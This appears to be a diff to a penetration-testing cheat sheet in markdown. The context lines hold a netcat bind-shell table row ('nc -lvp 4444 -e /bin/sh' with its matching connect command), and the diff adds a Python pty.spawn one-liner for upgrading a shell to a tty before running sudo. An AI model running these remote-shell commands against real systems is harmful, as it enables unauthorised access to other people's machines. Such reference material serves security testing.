@@ -12,3 +12,8 @@
 | tool   | local                 |      | remote                         |
 |--------|-----------------------|------|--------------------------------|
 | netcat | nc 192.168.1.2 4444   |  ->  | nc -lvp 4444 -e /bin/sh        |
+
+
+### sudo: sorry, you must have a tty to run sudo
+
+`python -c 'import pty;pty.spawn("/bin/bash")'`
